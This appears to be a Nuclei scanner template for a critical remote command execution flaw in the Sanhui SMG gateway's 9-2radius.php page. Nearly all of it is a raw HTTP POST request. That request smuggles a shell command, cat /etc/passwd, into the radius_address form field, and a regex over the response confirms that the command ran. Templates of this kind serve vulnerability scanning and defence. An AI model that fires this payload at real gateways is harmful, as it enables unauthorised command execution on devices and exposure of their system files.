id: sanhuiSMG-9-2radius-rce

info:
  name: 三汇SMG网关管理软件 9-2radius.php 存在远程命令执行漏洞
  author: sanhuiSMG
  severity: critical
  tags: sanhuiSMG

http:
  - raw:
      - |
        POST /en/9-2radius.php?authority=6 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded

        save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#

    matchers:
      - type: regex
        name: linux
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'
      - type: status
        status:
          - 200
    matchers-condition: and